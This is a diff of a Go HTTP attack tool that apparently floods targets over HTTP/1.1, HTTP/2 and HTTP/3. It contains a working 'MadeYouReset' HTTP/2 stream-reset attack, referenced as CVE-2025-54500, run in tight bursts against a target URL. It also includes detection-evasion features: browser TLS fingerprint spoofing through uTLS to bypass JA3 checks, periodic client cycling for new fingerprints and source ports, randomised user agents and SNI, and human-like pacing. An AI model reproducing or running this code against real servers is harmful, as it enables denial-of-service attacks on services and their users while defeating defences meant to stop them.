@@ -26,13 +26,8 @@ import (
 	"golang.org/x/net/http2"
 )
 
-// NOTE: This tool uses external libraries.
-// Please initialize Go modules in your directory if you haven't already:
-// 1. go mod init <your_project_name>
-// 2. go mod tidy
-
 const (
-	maxAdaptiveDelay int64 = 8000 // Maximum adaptive delay in milliseconds (8 seconds)
+	maxAdaptiveDelay int64 = 8000
 )
 
 var (
@@ -40,7 +35,7 @@ var (
 	responsesRec         uint64
 	logMessages          []string
 	logMessagesMux       sync.Mutex
-	statusCounts         = make(map[string]map[int]uint64) // Protocol -> StatusCode -> Count
+	statusCounts         = make(map[string]map[int]uint64)
 	statusCountsMux      sync.Mutex
 	currentDelay         int64
 	totalLatency         int64
@@ -194,7 +189,6 @@ func logMessage(msg string) {
 	logMessagesMux.Lock()
 	defer logMessagesMux.Unlock()
 	logMessages = append(logMessages, time.Now().Format("15:04:05")+" "+msg)
-	// MODIFIED: Changed log length from 5 to 3.
 	if len(logMessages) > 3 {
 		logMessages = logMessages[len(logMessages)-3:]
 	}
@@ -215,7 +209,6 @@ func detectSupportedHTTPVersions(target string, insecureTLS bool) []string {
 	host := parsed.Hostname()
 	userAgent := "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36"
 
-	// --- HTTP/3 Check ---
 	h3RoundTripper := &http3.RoundTripper{
 		TLSClientConfig: &tls.Config{InsecureSkipVerify: insecureTLS, ServerName: host},
 	}
@@ -231,7 +224,6 @@ func detectSupportedHTTPVersions(target string, insecureTLS bool) []string {
 	}
 	h3RoundTripper.Close()
 
-	// --- HTTP/2 Check ---
 	h2Transport := &http2.Transport{
 		TLSClientConfig: &tls.Config{InsecureSkipVerify: insecureTLS, ServerName: host},
 	}
@@ -246,7 +238,6 @@ func detectSupportedHTTPVersions(target string, insecureTLS bool) []string {
 		respH2.Body.Close()
 	}
 
-	// --- HTTP/1.1 Check ---
 	h1Transport := &http.Transport{
 		TLSClientConfig: &tls.Config{InsecureSkipVerify: insecureTLS, ServerName: host},
 		TLSNextProto:    make(map[string]func(string, *tls.Conn) http.RoundTripper),
@@ -273,10 +264,6 @@ func detectSupportedHTTPVersions(target string, insecureTLS bool) []string {
 	return result
 }
 
-// MODIFIED: Reworked the "MadeYouReset" attack to align with the NodeJS reference (CVE-2025-54500).
-// This method now attempts to trigger a server-side RST_STREAM by sending a POST request,
-// aiming to violate protocol rules. A success is recorded when the server resets the stream,
-// which is detected as an http2.StreamError on the client side.
 func madeYouResetAttack(parentCtx context.Context, config *workerConfig, client *http.Client) {
 	select {
 	case <-parentCtx.Done():
@@ -288,7 +275,7 @@ func madeYouResetAttack(parentCtx context.Context, config *workerConfig, client 
 	body, contentType := generateRandomPayload(format)
 	req, err := http.NewRequestWithContext(parentCtx, "POST", config.targetURL, body)
 	if err != nil {
-		return // Cannot create request, do nothing.
+		return
 	}
 	req.Header.Set("User-Agent", getRandomElement(userAgents))
 	req.Header.Set("Cache-Control", "no-store")
@@ -300,25 +287,19 @@ func madeYouResetAttack(parentCtx context.Context, config *workerConfig, client 
 
 	if err != nil {
 		var streamErr http2.StreamError
-		// errors.As checks if the error is or wraps an http2.StreamError. This indicates a server-side reset.
 		if errors.As(err, &streamErr) {
-			// SUCCESS: The server sent RST_STREAM. This is the intended outcome.
 			atomic.AddUint64(&madeYouResetSuccess, 1)
 			logMessage(statusOkColor.Sprintf("[H2-RESET] Success (Server Reset Stream)"))
 		} else if err != context.Canceled {
-			// This is an unexpected network or client error.
 			atomic.AddUint64(&madeYouResetErrors, 1)
 			logMessage(statusErrColor.Sprintf("[H2-RESET] Network Error: %v", err))
 		}
-		// context.Canceled errors are ignored as they typically mean the test is ending.
 	} else if resp != nil {
-		// A response was received, which is not a successful reset attack.
-		// We still process it to record the status code for diagnostics.
 		io.Copy(io.Discard, resp.Body)
 		resp.Body.Close()
 		atomic.AddUint64(&responsesRec, 1)
 		statusCountsMux.Lock()
-		if _, ok := statusCounts["2"]; !ok { // Hardcode "2" for H2 reset attack
+		if _, ok := statusCounts["2"]; !ok {
 			statusCounts["2"] = make(map[int]uint64)
 		}
 		statusCounts["2"][resp.StatusCode]++
@@ -326,7 +307,6 @@ func madeYouResetAttack(parentCtx context.Context, config *workerConfig, client 
 	}
 }
 
-// ENHANCEMENT: Create a custom Dial function that uses uTLS to bypass JA3 fingerprinting.
 func buildUTLSConn(insecureTLS bool, sni string) func(ctx context.Context, network, addr string) (net.Conn, error) {
 	return func(ctx context.Context, network, addr string) (net.Conn, error) {
 		dialer := &net.Dialer{Timeout: 30 * time.Second, KeepAlive: 30 * time.Second}
@@ -340,7 +320,6 @@ func buildUTLSConn(insecureTLS bool, sni string) func(ctx context.Context, netwo
 			InsecureSkipVerify: insecureTLS,
 		}
 
-		// Randomly select a browser fingerprint to impersonate.
 		var clientHello utls.ClientHelloID
 		switch mathrand.Intn(4) {
 		case 0:
@@ -348,7 +327,6 @@ func buildUTLSConn(insecureTLS bool, sni string) func(ctx context.Context, netwo
 		case 1:
 			clientHello = utls.HelloFirefox_120
 		case 2:
-			// FIXED: Replaced undefined HelloIOS_17 with a more common and stable fingerprint.
 			clientHello = utls.HelloSafari_16_0
 		default:
 			clientHello = utls.HelloRandomized
@@ -363,15 +341,12 @@ func buildUTLSConn(insecureTLS bool, sni string) func(ctx context.Context, netwo
 	}
 }
 
-// FIXED: Corrected HTTP/1.1 client creation to prevent handshake errors.
 func buildHTTPClient(config *workerConfig, httpVersion string) *http.Client {
 	sni := randomSNI(config.targetURL)
-	// This custom dialer performs the TCP dial and the full TLS handshake.
 	dialer := buildUTLSConn(config.insecureTLS, sni)
 
 	if httpVersion == "2" {
 		h2Transport := &http2.Transport{
-			// http2.Transport requires a connection that has already completed the TLS handshake.
 			DialTLSContext: func(ctx context.Context, network, addr string, _ *tls.Config) (net.Conn, error) {
 				return dialer(ctx, network, addr)
 			},
@@ -379,11 +354,8 @@ func buildHTTPClient(config *workerConfig, httpVersion string) *http.Client {
 		return &http.Client{Transport: h2Transport, Timeout: 30 * time.Second}
 	}
 
-	// For HTTP/1.1, we must also use DialTLSContext. Using the older DialContext would
-	// cause the http.Transport to attempt a second, failing handshake over the already-encrypted stream.
 	transport := &http.Transport{
 		Proxy: http.ProxyFromEnvironment,
-		// CORRECT: Use DialTLSContext because our dialer provides a connection that has already been handshaked.
 		DialTLSContext: func(ctx context.Context, network, addr string) (net.Conn, error) {
 			return dialer(ctx, network, addr)
 		},
@@ -391,15 +363,12 @@ func buildHTTPClient(config *workerConfig, httpVersion string) *http.Client {
 		IdleConnTimeout:       90 * time.Second,
 		TLSHandshakeTimeout:   10 * time.Second,
 		ExpectContinueTimeout: 1 * time.Second,
-		// This is crucial: it disables ALPN, which prevents the connection from upgrading to HTTP/2, forcing HTTP/1.1.
-		TLSNextProto: make(map[string]func(string, *tls.Conn) http.RoundTripper),
+		TLSNextProto:          make(map[string]func(string, *tls.Conn) http.RoundTripper),
 	}
 	return &http.Client{Transport: transport, Timeout: 30 * time.Second}
 }
 
 func buildHTTP3Client(config *workerConfig) *http.Client {
-	// uTLS is harder to integrate directly with QUIC, so we use standard TLS for H3
-	// but can still randomize other aspects like SNI.
 	return &http.Client{
 		Transport: &http3.RoundTripper{
 			TLSClientConfig:    &tls.Config{InsecureSkipVerify: config.insecureTLS, ServerName: randomSNI(config.targetURL)},
@@ -450,10 +419,8 @@ func worker(ctx context.Context, wg *sync.WaitGroup, config *workerConfig, httpV
 
 	var client *http.Client
 	var burstsSinceLastCycle int
-	// ENHANCEMENT: Cycle client to get new connection, new source port, and new JA3 fingerprint.
-	const clientCycleThreshold = 50 // Recreate the client every 50 bursts.
+	const clientCycleThreshold = 50
 
-	// Initial client creation
 	if httpVersion == "3" {
 		client = buildHTTP3Client(config)
 	} else {
@@ -469,7 +436,6 @@ func worker(ctx context.Context, wg *sync.WaitGroup, config *workerConfig, httpV
 				case <-ctx.Done():
 					return
 				case <-ticker.C:
-					// Run N attacks in a tight loop to increase pressure.
 					for i := 0; i < 3+mathrand.Intn(5); i++ {
 						madeYouResetAttack(ctx, config, client)
 					}
@@ -479,13 +445,10 @@ func worker(ctx context.Context, wg *sync.WaitGroup, config *workerConfig, httpV
 	}
 
 	for {
-		// --- Client Cycling Logic ---
 		if burstsSinceLastCycle > clientCycleThreshold {
-			// Close idle connections of the old client
 			if transport, ok := client.Transport.(interface{ CloseIdleConnections() }); ok {
 				transport.CloseIdleConnections()
 			}
-			// Create a new client
 			if httpVersion == "3" {
 				client = buildHTTP3Client(config)
 			} else {
@@ -495,7 +458,6 @@ func worker(ctx context.Context, wg *sync.WaitGroup, config *workerConfig, httpV
 			logMessage(fmt.Sprintf("[H%s] Client cycled (new JA3/H2 fingerprint)", httpVersion))
 		}
 
-		// 1. Burst Phase
 		var burstCount int
 		if config.burst {
 			burstCount = 1 + mathrand.Intn(config.burstSize)
@@ -620,8 +582,7 @@ func worker(ctx context.Context, wg *sync.WaitGroup, config *workerConfig, httpV
 				}
 				logMessage(fmt.Sprintf("[H%s] %s -> %d %s (%dms)", httpVersion, reqURL, resp.StatusCode, statusText, latency))
 
-				// ENHANCEMENT: Add a small "pacing" delay within a burst to seem more human.
-				if i < burstCount-1 { // Don't sleep after the last request in the burst
+				if i < burstCount-1 {
 					pacingDelay := time.Duration(50+mathrand.Intn(200)) * time.Millisecond
 					time.Sleep(pacingDelay)
 				}
@@ -630,7 +591,6 @@ func worker(ctx context.Context, wg *sync.WaitGroup, config *workerConfig, httpV
 
 		burstsSinceLastCycle++
 
-		// 2. Think Time Phase
 		var baseDelay int64
 		if config.adaptiveDelay {
 			baseDelay = atomic.LoadInt64(&currentDelay)
@@ -748,7 +708,6 @@ func printProgress(endTime, startTime time.Time, config *workerConfig) {
 	sb.WriteString(headerColor.Sprint("Response Status Counts:\n"))
 
 	statusCountsMux.Lock()
-	// Prepare data for each column
 	protocols := []string{"1.1", "2", "3"}
 	protocolData := make(map[string][]string)
 	maxStatusRows := 0
@@ -783,7 +742,6 @@ func printProgress(endTime, startTime time.Time, config *workerConfig) {
 	}
 	statusCountsMux.Unlock()
 
-	// Print headers
 	headers := map[string]string{"1.1": "H1.1:", "2": "H2:", "3": "H3:"}
 	colWidth := 50
 	headerLine := ""
@@ -792,7 +750,6 @@ func printProgress(endTime, startTime time.Time, config *workerConfig) {
 	}
 	sb.WriteString(headerColor.Sprint(headerLine + "\n"))
 
-	// Print rows
 	for i := 0; i < maxStatusRows; i++ {
 		rowLine := ""
 		for _, p := range protocols {
@@ -824,7 +781,6 @@ func printProgress(endTime, startTime time.Time, config *workerConfig) {
 	}
 	errorMux.Unlock()
 
-	// Add MadeYouReset stats
 	if isH2Active {
 		attempts := atomic.LoadUint64(&madeYouResetAttempts)
 		success := atomic.LoadUint64(&madeYouResetSuccess)
@@ -841,7 +797,6 @@ func printProgress(endTime, startTime time.Time, config *workerConfig) {
 	copy(logs, logMessages)
 	logMessagesMux.Unlock()
 	sb.WriteString(headerColor.Sprint("---------------------------------------------------------------------------------------------------------------------------------------------------------------\n"))
-	// MODIFIED: Changed log title from "5 events" to "3 events".
 	sb.WriteString(headerColor.Sprint("Log (last 3 events):\n"))
 	for i := len(logs) - 1; i >= 0; i-- {
 		sb.WriteString(logs[i] + "\n")
